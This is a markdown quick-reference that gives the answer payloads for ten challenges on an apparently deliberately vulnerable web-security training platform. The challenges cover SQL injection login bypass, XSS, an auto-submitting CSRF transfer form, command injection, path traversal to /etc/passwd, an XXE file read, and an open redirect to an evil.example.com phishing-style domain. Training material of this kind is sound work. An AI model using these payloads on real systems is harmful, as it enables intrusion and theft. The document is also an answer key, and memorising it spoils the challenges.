# Challenge Payloads — Quick Reference

All payloads are production-ready for use inside the platform's attack pages.
Copy them exactly as shown. Each section includes the input field(s), the
payload to paste, and what a successful response looks like.

---

## 1. SQL Injection

**Challenge page:** `/challenges/1/attack`  
**Goal:** Bypass the login form and gain access without a valid password.

### Payload — Username field

```
' OR 1=1 --
```

**Password field:** anything (e.g. `x`)

**What happens:** The server builds the query by concatenating your input
directly, producing:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```
`OR 1=1` is always true; `--` comments out the rest. The first row
(admin) is returned and login is granted.

### Alternative payloads

```
' OR '1'='1
```
```
admin' --
```
```
' OR 1=1 #
```

---

## 2. Cross-Site Scripting (XSS)

**Challenge page:** `/challenges/2/attack`  
**Goal:** Post a comment that executes JavaScript inside the vulnerable render sandbox.

### Payload — Comment field (recommended)

```
<img src=x onerror="window.__xssChallengeSuccess('owned')">
```

Paste into the **Comment** textarea and click **Post Comment**.
The iframe will render the unsanitized comment; the `onerror` handler fires
and the challenge auto-completes.

### Alternative payloads

```
<script>alert(document.cookie)</script>
```
```
<svg onload="alert('XSS')">
```
```
<img src=x onerror="alert(1)">
```
```
<body onload="window.__xssChallengeSuccess('xss')">
```

> **Note:** The `window.__xssChallengeSuccess(...)` and `alert(...)` calls
> both send a `postMessage` to the parent that triggers challenge completion.
> Any of the payloads above will work.

---

## 3. CSRF (Cross-Site Request Forgery)

**Challenge page:** `/challenges/3/attack`  
**Goal:** Transfer money from Alice to Bob without Alice's knowledge by injecting a hidden auto-submitting HTML form.

### Payload — CSRF Form (paste into the payload textarea)

```html
<form id="csrf" action="http://localhost:8000/api/challenges/csrf/transfer" method="POST">
  <input type="hidden" name="to_user" value="Bob">
  <input type="hidden" name="amount" value="500">
</form>
<script>document.getElementById('csrf').submit();</script>
```

Click **Execute Attack**. The iframe submits the form with Alice's implicit
session, transferring $500 to Bob. Alice's balance drops; challenge completes.

### Transfer all funds variant

```html
<form id="csrf" action="http://localhost:8000/api/challenges/csrf/transfer" method="POST">
  <input type="hidden" name="to_user" value="Bob">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

---

## 4. Command Injection

**Challenge page:** `/challenges/4/attack`  
**Goal:** Inject a shell command after the ping host so the marker string appears in the output.

### Payload — Host field

```
127.0.0.1; echo COMMAND_INJECTION_SUCCESS
```

Type or paste into the **Ping Checker** input and click **Ping**.  
The backend detects the `;` separator, isolates the injected segment, and
simulates execution. Because `COMMAND_INJECTION_SUCCESS` is present in the
injected part, `success: true` is returned and the challenge completes.

### Alternative separators (all work)

```
127.0.0.1 && echo COMMAND_INJECTION_SUCCESS
```
```
127.0.0.1 || echo COMMAND_INJECTION_SUCCESS
```
```
127.0.0.1 | echo COMMAND_INJECTION_SUCCESS
```

### Minimal payload (no ping target needed)

```
x; echo COMMAND_INJECTION_SUCCESS
```

---

## 5. Broken Authentication

**Challenge page:** `/challenges/5/attack`  
**Goal:** Log in as `admin` without knowing the password using a SQL injection bypass.

### Payload — Password field

```
' OR 1=1 --
```

**Username field:** `admin@scale.edu` (pre-filled)

**What happens:** The login endpoint builds the query by string
interpolation. The payload breaks out of the password literal and makes the
condition always true, granting admin access.

### Alternative payloads — Password field

```
' OR '1'='1' --
```
```
anything' OR 1=1 --
```
```
' OR 1=1 #
```

---

## 6. Security Misconfiguration

**Challenge page:** `/challenges/6/attack`  
**Goal:** Discover an exposed admin configuration endpoint that should never be reachable in production.

### Payload — API Explorer path field

```
/admin/config
```

Type into the **Internal Admin API Explorer** path field and click **SEND**.  
The endpoint returns sensitive server configuration (database URL, secret
keys, debug flags) without authentication. The challenge completes
automatically when this path is probed.

### Other hidden endpoints worth probing (for exploration)

```
/debug
```
```
/.env
```
```
/admin/users
```

---

## 7. Insecure Storage

**Challenge page:** `/challenges/7/attack`  
**Goal:** Register an account, then dump storage to prove your password is stored in plaintext.

### Step 1 — Register (fill in both fields)

| Field    | Value         |
|----------|---------------|
| Username | `victim`      |
| Password | `supersecret` |

Click **Register**.

### Step 2 — Dump Storage

Click **Dump Storage**.  
The dump endpoint returns all stored credentials with passwords in plain
text. The challenge completes when your registered username is found in the
dump with its original password visible.

> Any username/password combination works — just make sure to register
> first; the "Dump Storage" button is locked until you do.

---

## 8. Directory Traversal

**Challenge page:** `/challenges/8/attack`  
**Goal:** Read a file outside the intended uploads directory using `../` sequences.

### Payload — File path field

```
../../../../etc/passwd
```

The server joins this to the base uploads directory without sanitisation,
resolving to `/etc/passwd`. The file contents are returned in the response.

### Alternative traversal payloads

```
../../../etc/passwd
```
```
../../../../etc/hosts
```
```
../../../../proc/self/environ
```

### URL-encoded variant (if input is in a query string)

```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

---

## 9. XXE (XML External Entity)

**Challenge page:** `/challenges/9/attack`  
**Goal:** Read `/etc/passwd` from the server by injecting an external entity into the XML parser.

### Payload — XML input field

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

Paste into the XML textarea and click **Parse**. The vulnerable lxml
parser resolves the `file:///etc/passwd` entity and inlines the file
contents into the parsed output. The challenge completes when
`root:x:` appears in the response.

### Read /etc/hosts variant

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<user><name>&xxe;</name></user>
```

---

## 10. Open Redirect

**Challenge page:** `/challenges/10/attack`  
**Goal:** Craft a URL using the app's redirect parameter that sends the user to an external attacker-controlled domain.

### Direct URL (paste in browser or use the attack page)

```
http://localhost:8000/api/challenges/redirect?url=https://evil.example.com
```

The endpoint performs no validation and issues an immediate HTTP 302 to
whatever `url` is provided.

### Using the attack page input

Paste the `url` value into the redirect target field:

```
https://evil.example.com
```

### Phishing variant (realistic)

```
https://accounts.google.com.evil-attacker.com
```

---

## Summary Table

| # | Challenge              | Where to paste               | Payload (copy this)                                      |
|---|------------------------|------------------------------|----------------------------------------------------------|
| 1 | SQL Injection          | Username field               | `' OR 1=1 --`                                            |
| 2 | XSS                    | Comment textarea             | `<img src=x onerror="window.__xssChallengeSuccess('owned')">`|
| 3 | CSRF                   | Payload textarea             | See HTML form block in §3 above                          |
| 4 | Command Injection      | Host / Ping field            | `127.0.0.1; echo COMMAND_INJECTION_SUCCESS`              |
| 5 | Broken Authentication  | Password field               | `' OR 1=1 --`                                            |
| 6 | Security Misconfiguration | API Explorer path field   | `/admin/config`                                          |
| 7 | Insecure Storage       | Username + Password fields   | Register `victim` / `supersecret`, then Dump             |
| 8 | Directory Traversal    | File path field              | `../../../../etc/passwd`                                 |
| 9 | XXE                    | XML textarea                 | See XML block in §9 above                                |
|10 | Open Redirect          | Redirect target / URL param  | `https://evil.example.com`                               |
